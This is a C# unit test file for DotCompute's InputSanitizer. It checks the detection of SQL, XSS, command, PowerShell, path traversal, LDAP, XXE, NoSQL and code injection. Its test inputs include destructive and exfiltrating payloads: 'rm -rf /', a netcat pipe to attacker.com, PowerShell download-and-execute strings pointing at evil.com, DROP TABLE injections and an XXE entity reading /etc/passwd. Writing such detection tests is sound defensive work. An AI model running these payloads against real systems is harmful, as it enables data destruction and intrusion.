// Copyright (c) 2025 Michael Ivertowski
// Licensed under the MIT License. See LICENSE file in the project root for license information.

using DotCompute.Core.Security;
using DotCompute.Core.Security.Types;
using Microsoft.Extensions.Logging;
using NSubstitute;

namespace DotCompute.Core.Tests.Security;

/// <summary>
/// Comprehensive unit tests for InputSanitizer covering security validation and sanitization.
/// Tests input validation, kernel parameter validation, file path validation, and malicious input detection.
/// </summary>
public sealed class InputSanitizerTests : IDisposable
{
    private readonly ILogger<InputSanitizer> _logger;
    private readonly InputSanitizer _sanitizer;

    public InputSanitizerTests()
    {
        _logger = Substitute.For<ILogger<InputSanitizer>>();
        _sanitizer = new InputSanitizer(_logger);
    }

    public void Dispose() => _sanitizer?.Dispose();

    #region Constructor and Configuration Tests

    [Fact]
    public void Constructor_WithValidLogger_ShouldInitialize()
    {
        // Arrange & Act
        using var sanitizer = new InputSanitizer(_logger);

        // Assert
        _ = sanitizer.Should().NotBeNull();
    }

    [Fact]
    public void Constructor_WithNullLogger_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = () => new InputSanitizer(null!);

        // Assert
        _ = action.Should().Throw<ArgumentNullException>()
            .WithParameterName("logger");
    }

    [Fact]
    public void Constructor_WithCustomConfiguration_ShouldUseCustomSettings()
    {
        // Arrange
        var customConfig = new InputSanitizationConfiguration
        {
            MaxInputLength = 500,
            MaxHighSeverityThreats = 1
        };

        // Act
        using var sanitizer = new InputSanitizer(_logger, customConfig);

        // Assert
        _ = sanitizer.Should().NotBeNull();
    }

    [Fact]
    public void GetStatistics_ShouldReturnInitialState()
    {
        // Act
        var stats = _sanitizer.GetStatistics();

        // Assert
        _ = stats.Should().NotBeNull();
        _ = stats.TotalValidations.Should().Be(0);
        _ = stats.TotalThreatsDetected.Should().Be(0);
        _ = stats.TotalSecurityViolations.Should().Be(0);
    }

    #endregion

    #region String Sanitization Tests

    [Fact]
    public async Task SanitizeStringAsync_WithValidInput_ShouldReturnSecureResult()
    {
        // Arrange
        var input = "valid_input";
        var context = "test";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsSecure.Should().BeTrue();
        _ = result.SanitizedInput.Should().NotBeNullOrEmpty();
        _ = result.OriginalInput.Should().Be(input);
        _ = result.Context.Should().Be(context);
    }

    [Fact]
    public async Task SanitizeStringAsync_WithNullInput_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = async () => await _sanitizer.SanitizeStringAsync(null!, "context");

        // Assert
        _ = await action.Should().ThrowAsync<ArgumentNullException>();
    }

    [Fact]
    public async Task SanitizeStringAsync_WithNullContext_ShouldThrowArgumentException()
    {
        // Arrange & Act
        var action = async () => await _sanitizer.SanitizeStringAsync("input", null!);

        // Assert
        _ = await action.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task SanitizeStringAsync_WithEmptyContext_ShouldThrowArgumentException()
    {
        // Arrange & Act
        var action = async () => await _sanitizer.SanitizeStringAsync("input", "");

        // Assert
        _ = await action.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task SanitizeStringAsync_WithExcessiveLength_ShouldDetectThreat()
    {
        // Arrange
        var input = new string('a', 10001); // Exceeds default MaxInputLength of 10000
        var context = "test";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsSecure.Should().BeFalse();
        _ = result.SecurityThreats.Should().ContainSingle(t => t.ThreatType == ThreatType.ExcessiveLength);
    }

    [Fact]
    public async Task SanitizeStringAsync_WithNullByte_ShouldDetectThreat()
    {
        // Arrange
        var input = "test\0injection";
        var context = "test";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.NullByteInjection);
    }

    [Fact]
    public async Task SanitizeStringAsync_WithControlCharacters_ShouldDetectThreat()
    {
        // Arrange
        var input = "test\x01\x02\x03";
        var context = "test";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.ControlCharacters);
    }

    #endregion

    #region SQL Injection Detection Tests

    [Theory]
    [InlineData("SELECT * FROM users")]
    [InlineData("'; DROP TABLE users--")]
    [InlineData("1' OR '1'='1")]
    [InlineData("admin'--")]
    [InlineData("1; DELETE FROM users")]
    public async Task SanitizeStringAsync_WithSqlInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "sql_query";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.SqlInjection);
    }

    [Theory]
    [InlineData("UNION SELECT password FROM users")]
    [InlineData("'; EXEC sp_executesql")]
    [InlineData("1; WAITFOR DELAY '00:00:05'")]
    public async Task SanitizeStringAsync_WithAdvancedSqlInjection_ShouldDetectCriticalThreat(string maliciousInput)
    {
        // Arrange
        var context = "sql_query";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t =>
            t.ThreatType == ThreatType.SqlInjection &&
            t.Severity >= ThreatSeverity.High);
    }

    #endregion

    #region XSS Injection Detection Tests

    [Theory]
    [InlineData("<script>alert('XSS')</script>")]
    [InlineData("<img src=x onerror=alert('XSS')>")]
    [InlineData("javascript:alert('XSS')")]
    [InlineData("<iframe src='malicious.com'></iframe>")]
    public async Task SanitizeStringAsync_WithXssInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "html_input";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.XssInjection);
    }

    [Fact]
    public async Task SanitizeStringAsync_WithHtmlSanitization_ShouldEncodeHtmlEntities()
    {
        // Arrange
        var input = "<div>Test & Example</div>";
        var context = "html";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.Html);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().Contain("&lt;")
            .And.Contain("&gt;")
            .And.Contain("&amp;");
    }

    #endregion

    #region Command Injection Detection Tests

    [Theory]
    [InlineData("test;rm -rf /")]
    [InlineData("$(whoami)")]
    [InlineData("`cat /etc/passwd`")]
    [InlineData("test|nc attacker.com 1234")]
    public async Task SanitizeStringAsync_WithCommandInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "command";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.CommandInjection);
    }

    [Theory]
    [InlineData("Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')")]
    [InlineData("IEX (iwr 'http://evil.com')")]
    public async Task SanitizeStringAsync_WithPowershellInjection_ShouldDetectCriticalThreat(string maliciousInput)
    {
        // Arrange
        var context = "command";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t =>
            t.Severity == ThreatSeverity.Critical);
    }

    #endregion

    #region Path Traversal Detection Tests

    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("..\\..\\windows\\system32\\config\\sam")]
    [InlineData("%2e%2e%2f%2e%2e%2fetc%2fpasswd")]
    [InlineData("....//....//etc/passwd")]
    public async Task SanitizeStringAsync_WithPathTraversal_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "filepath";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.PathTraversal);
    }

    #endregion

    #region Other Injection Detection Tests

    [Theory]
    [InlineData("*)(uid=*))(|(uid=*")]
    [InlineData("admin)(|(password=*)")]
    public async Task SanitizeStringAsync_WithLdapInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "ldap_query";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.LdapInjection);
    }

    [Theory]
    [InlineData("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>")]
    [InlineData("<![CDATA[malicious content]]>")]
    public async Task SanitizeStringAsync_WithXmlInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "xml_data";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.XmlInjection);
    }

    [Theory]
    [InlineData("{\"$where\": \"this.password == 'test'\"}")]
    [InlineData("{\"$regex\": \".*\"}")]
    [InlineData("{\"$ne\": null}")]
    public async Task SanitizeStringAsync_WithNoSqlInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "nosql_query";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.NoSqlInjection);
    }

    [Theory]
    [InlineData("eval('malicious code')")]
    [InlineData("exec('import os; os.system(\"ls\")')")]
    [InlineData("system('cat /etc/passwd')")]
    public async Task SanitizeStringAsync_WithCodeInjection_ShouldDetectThreat(string maliciousInput)
    {
        // Arrange
        var context = "code_input";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(maliciousInput, context);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.CodeInjection);
    }

    #endregion

    #region Sanitization Type Tests

    [Fact]
    public async Task SanitizeStringAsync_WithSqlSanitization_ShouldEscapeSqlCharacters()
    {
        // Arrange
        var input = "test'; DROP--";
        var context = "sql";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.Sql);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().Contain("''")  // Escaped single quote
            .And.Contain("\\;")  // Escaped semicolon
            .And.Contain("\\--");  // Escaped comment
    }

    [Fact]
    public async Task SanitizeStringAsync_WithFilePathSanitization_ShouldRemoveDangerousCharacters()
    {
        // Arrange
        var input = "../test~file.txt";
        var context = "filepath";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.FilePath);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().NotContain("..")
            .And.NotContain("~");
    }

    [Fact]
    public async Task SanitizeStringAsync_WithEmailSanitization_ShouldRemoveInvalidCharacters()
    {
        // Arrange
        var input = "test<>@example.com";
        var context = "email";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.Email);

        // Assert
        _ = result.Should().NotBeNull();
        // Email sanitization removes invalid characters like < and > but keeps valid email chars
        _ = result.SanitizedInput.Should().NotContain("<")
            .And.NotContain(">")
            .And.Be("test@example.com"); // Only < and > are removed
    }

    [Fact]
    public async Task SanitizeStringAsync_WithAlphaNumericSanitization_ShouldKeepOnlyAlphaNumeric()
    {
        // Arrange
        var input = "test123!@#$%";
        var context = "alphanumeric";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.AlphaNumeric);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().Match("test123");
    }

    [Fact]
    public async Task SanitizeStringAsync_WithNumericSanitization_ShouldKeepOnlyNumbers()
    {
        // Arrange
        var input = "123abc456.789";
        var context = "numeric";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.Numeric);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().MatchRegex(@"^[\d.-]+$");
    }

    [Fact]
    public async Task SanitizeStringAsync_WithKernelParameterSanitization_ShouldRemoveDangerousCharacters()
    {
        // Arrange
        var input = "param;|&`$(){}[]";
        var context = "kernel_param";

        // Act
        var result = await _sanitizer.SanitizeStringAsync(input, context, SanitizationType.KernelParameter);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SanitizedInput.Should().Match("param");
    }

    #endregion

    #region Kernel Parameter Validation Tests

    [Fact]
    public async Task ValidateKernelParametersAsync_WithValidParameters_ShouldReturnValid()
    {
        // Arrange
        var parameters = new Dictionary<string, object>
        {
            ["size"] = 1024,
            ["name"] = "test_kernel",
            ["enabled"] = true
        };

        // Act
        var result = await _sanitizer.ValidateKernelParametersAsync(parameters, "TestKernel");

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeTrue();
        _ = result.HasInvalidParameters.Should().BeFalse();
        _ = result.ParameterCount.Should().Be(3);
    }

    [Fact]
    public async Task ValidateKernelParametersAsync_WithNullParameters_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = async () => await _sanitizer.ValidateKernelParametersAsync(null!, "TestKernel");

        // Assert
        _ = await action.Should().ThrowAsync<ArgumentNullException>();
    }

    [Fact]
    public async Task ValidateKernelParametersAsync_WithNullKernelName_ShouldThrowArgumentException()
    {
        // Arrange
        var parameters = new Dictionary<string, object>();

        // Act
        var action = async () => await _sanitizer.ValidateKernelParametersAsync(parameters, null!);

        // Assert
        _ = await action.Should().ThrowAsync<ArgumentException>();
    }

    [Fact]
    public async Task ValidateKernelParametersAsync_WithMaliciousParameter_ShouldDetectThreat()
    {
        // Arrange
        var parameters = new Dictionary<string, object>
        {
            ["malicious"] = "'; DROP TABLE--"
        };

        // Act
        var result = await _sanitizer.ValidateKernelParametersAsync(parameters, "TestKernel");

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.HasInvalidParameters.Should().BeTrue();
        _ = result.InvalidParameters.Should().Contain("malicious");
        _ = result.SecurityThreats.Should().NotBeEmpty();
    }

    [Fact]
    public async Task ValidateKernelParametersAsync_WithPathParameter_ShouldUsePathSanitizationType()
    {
        // Arrange
        var parameters = new Dictionary<string, object>
        {
            ["file_path"] = "../../etc/passwd"
        };

        // Act
        var result = await _sanitizer.ValidateKernelParametersAsync(parameters, "TestKernel");

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.ParameterResults.Should().ContainKey("file_path");
        _ = result.ParameterResults["file_path"].IsValid.Should().BeFalse(); // Path traversal should be invalid
    }

    [Fact]
    public async Task ValidateKernelParametersAsync_WithUrlParameter_ShouldUseUrlSanitizationType()
    {
        // Arrange
        var parameters = new Dictionary<string, object>
        {
            ["api_url"] = "http://example.com"
        };

        // Act
        var result = await _sanitizer.ValidateKernelParametersAsync(parameters, "TestKernel");

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.ParameterResults.Should().ContainKey("api_url");
        _ = result.ParameterResults["api_url"].IsValid.Should().BeTrue(); // Valid URL should pass
    }

    #endregion

    #region File Path Validation Tests

    [Fact]
    public void ValidateFilePath_WithValidPath_ShouldReturnValid()
    {
        // Arrange
        var baseDir = Path.GetTempPath();
        var filePath = Path.Combine(baseDir, "test.txt");

        // Act
        var result = _sanitizer.ValidateFilePath(filePath, baseDir);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeTrue();
        _ = result.SanitizedPath.Should().NotBeNullOrEmpty();
    }

    [Fact]
    public void ValidateFilePath_WithNullPath_ShouldThrowArgumentException()
    {
        // Arrange & Act
        var action = () => _sanitizer.ValidateFilePath(null!, Path.GetTempPath());

        // Assert
        _ = action.Should().Throw<ArgumentException>();
    }

    [Fact]
    public void ValidateFilePath_WithNullBaseDirectory_ShouldThrowArgumentException()
    {
        // Arrange & Act
        var action = () => _sanitizer.ValidateFilePath("test.txt", null!);

        // Assert
        _ = action.Should().Throw<ArgumentException>();
    }

    [Fact]
    public void ValidateFilePath_WithPathTraversal_ShouldDetectThreat()
    {
        // Arrange
        var baseDir = Path.GetTempPath();
        var filePath = Path.Combine(baseDir, "..", "..", "etc", "passwd");

        // Act
        var result = _sanitizer.ValidateFilePath(filePath, baseDir);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.PathTraversal);
    }

    [Fact]
    public void ValidateFilePath_WithDisallowedExtension_ShouldDetectThreat()
    {
        // Arrange
        var baseDir = Path.GetTempPath();
        var filePath = Path.Combine(baseDir, "test.exe");
        var allowedExtensions = new[] { ".txt", ".csv" };

        // Act
        var result = _sanitizer.ValidateFilePath(filePath, baseDir, allowedExtensions);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.InvalidFileType);
    }

    [Fact]
    public void ValidateFilePath_WithSuspiciousFileName_ShouldDetectThreat()
    {
        // Arrange
        var baseDir = Path.GetTempPath();
        var filePath = Path.Combine(baseDir, "con.txt");

        // Act
        var result = _sanitizer.ValidateFilePath(filePath, baseDir);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.SuspiciousFileName);
    }

    [Theory]
    [InlineData("CON")]
    [InlineData("PRN")]
    [InlineData("AUX")]
    [InlineData("NUL")]
    [InlineData("COM1")]
    [InlineData("LPT1")]
    public void ValidateFilePath_WithReservedWindowsNames_ShouldDetectThreat(string reservedName)
    {
        // Arrange
        var baseDir = Path.GetTempPath();
        var filePath = Path.Combine(baseDir, $"{reservedName}.txt");

        // Act
        var result = _sanitizer.ValidateFilePath(filePath, baseDir);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.SecurityThreats.Should().Contain(t => t.ThreatType == ThreatType.SuspiciousFileName);
    }

    #endregion

    #region Work Group Validation Tests

    [Fact]
    public void ValidateWorkGroupSizes_WithValidDimensions_ShouldReturnValid()
    {
        // Arrange
        var workGroupSize = new[] { 16, 16 };
        var globalSize = new[] { 1024, 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeTrue();
        _ = result.TotalWorkGroupSize.Should().Be(256);
        _ = result.ValidationErrors.Should().BeEmpty();
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithNullWorkGroupSize_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = () => _sanitizer.ValidateWorkGroupSizes(null!, [1024]);

        // Assert
        _ = action.Should().Throw<ArgumentNullException>();
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithNullGlobalSize_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = () => _sanitizer.ValidateWorkGroupSizes([16], null!);

        // Assert
        _ = action.Should().Throw<ArgumentNullException>();
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithDimensionMismatch_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { 16, 16 };
        var globalSize = new[] { 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("dimension mismatch"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithInvalidDimensionCount_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { 16, 16, 16, 16 };  // 4D not allowed
        var globalSize = new[] { 1024, 1024, 1024, 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("Invalid dimension count"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithZeroWorkGroupSize_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { 0, 16 };
        var globalSize = new[] { 1024, 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("must be positive"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithNegativeWorkGroupSize_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { -16, 16 };
        var globalSize = new[] { 1024, 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("must be positive"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithExcessiveWorkGroupSize_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { 1024, 2 };  // Total = 2048, exceeds default max 1024
        var globalSize = new[] { 1024, 1024 };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("exceeds maximum"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithMisalignedGlobalSize_ShouldWarn()
    {
        // Arrange
        var workGroupSize = new[] { 16 };
        var globalSize = new[] { 1000 };  // Not divisible by 16

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.ValidationWarnings.Should().Contain(w => w.Contains("not evenly divisible"));
    }

    [Fact]
    public void ValidateWorkGroupSizes_WithExcessiveGlobalSize_ShouldReturnInvalid()
    {
        // Arrange
        var workGroupSize = new[] { 16 };
        var globalSize = new[] { int.MaxValue };

        // Act
        var result = _sanitizer.ValidateWorkGroupSizes(workGroupSize, globalSize);

        // Assert
        _ = result.Should().NotBeNull();
        _ = result.IsValid.Should().BeFalse();
        _ = result.ValidationErrors.Should().Contain(e => e.Contains("safety limit"));
    }

    #endregion

    #region Custom Validation Rules Tests

    [Fact]
    public void AddCustomValidationRule_WithValidRule_ShouldAddSuccessfully()
    {
        // Arrange
        var rule = new ValidationRule
        {
            RuleName = "CustomRule",
            Validator = input => input.Length > 5,
            ErrorMessage = "Input too short"
        };

        // Act
        _sanitizer.AddCustomValidationRule("custom_context", rule);

        // Assert
        // Rule should be added without exceptions
    }

    [Fact]
    public void AddCustomValidationRule_WithNullContext_ShouldThrowArgumentException()
    {
        // Arrange
        var rule = new ValidationRule
        {
            RuleName = "Test",
            Validator = _ => true,
            ErrorMessage = "Error"
        };

        // Act
        var action = () => _sanitizer.AddCustomValidationRule(null!, rule);

        // Assert
        _ = action.Should().Throw<ArgumentException>();
    }

    [Fact]
    public void AddCustomValidationRule_WithNullRule_ShouldThrowArgumentNullException()
    {
        // Arrange & Act
        var action = () => _sanitizer.AddCustomValidationRule("context", null!);

        // Assert
        _ = action.Should().Throw<ArgumentNullException>();
    }

    #endregion

    #region Statistics Tests

    [Fact]
    public async Task GetStatistics_AfterMultipleValidations_ShouldTrackCounts()
    {
        // Arrange
        _ = await _sanitizer.SanitizeStringAsync("test1", "context1");
        _ = await _sanitizer.SanitizeStringAsync("test2", "context2");
        _ = await _sanitizer.SanitizeStringAsync("<script>alert('xss')</script>", "context3");

        // Act
        var stats = _sanitizer.GetStatistics();

        // Assert
        _ = stats.TotalValidations.Should().Be(3);
        _ = stats.TotalThreatsDetected.Should().BeGreaterThan(0);
    }

    [Fact]
    public async Task GetStatistics_WithMaliciousInputs_ShouldTrackViolations()
    {
        // Arrange
        _ = await _sanitizer.SanitizeStringAsync("'; DROP TABLE users--", "sql");

        // Act
        var stats = _sanitizer.GetStatistics();

        // Assert
        _ = stats.TotalSecurityViolations.Should().BeGreaterThan(0);
        _ = stats.ThreatsByType.Should().ContainKey(ThreatType.SqlInjection.ToString());
    }

    [Fact]
    public async Task GetStatistics_WithDifferentSanitizationTypes_ShouldTrackByType()
    {
        // Arrange
        _ = await _sanitizer.SanitizeStringAsync("test", "ctx1", SanitizationType.Html);
        _ = await _sanitizer.SanitizeStringAsync("test", "ctx2", SanitizationType.Sql);
        _ = await _sanitizer.SanitizeStringAsync("test", "ctx3", SanitizationType.FilePath);

        // Act
        var stats = _sanitizer.GetStatistics();

        // Assert
        _ = stats.ValidationsByType.Should().HaveCount(3);
        _ = stats.ValidationsByType.Should().ContainKey(SanitizationType.Html.ToString());
        _ = stats.ValidationsByType.Should().ContainKey(SanitizationType.Sql.ToString());
        _ = stats.ValidationsByType.Should().ContainKey(SanitizationType.FilePath.ToString());
    }

    #endregion

    #region Disposal and Lifecycle Tests

    [Fact]
    public void Dispose_ShouldCleanupResources()
    {
        // Arrange
        var sanitizer = new InputSanitizer(_logger);

        // Act
        sanitizer.Dispose();

        // Assert - Verify disposed state by attempting operation
        var action = async () => await sanitizer.SanitizeStringAsync("test", "context");
        _ = action.Should().ThrowAsync<ObjectDisposedException>();
    }

    [Fact]
    public void Dispose_CalledMultipleTimes_ShouldNotThrow()
    {
        // Arrange
        var sanitizer = new InputSanitizer(_logger);

        // Act
        sanitizer.Dispose();
        var action = sanitizer.Dispose;

        // Assert
        _ = action.Should().NotThrow();
    }

    [Fact]
    public async Task SanitizeStringAsync_AfterDispose_ShouldThrowObjectDisposedException()
    {
        // Arrange
        var sanitizer = new InputSanitizer(_logger);
        sanitizer.Dispose();

        // Act
        var action = async () => await sanitizer.SanitizeStringAsync("test", "context");

        // Assert
        _ = await action.Should().ThrowAsync<ObjectDisposedException>();
    }

    #endregion
}
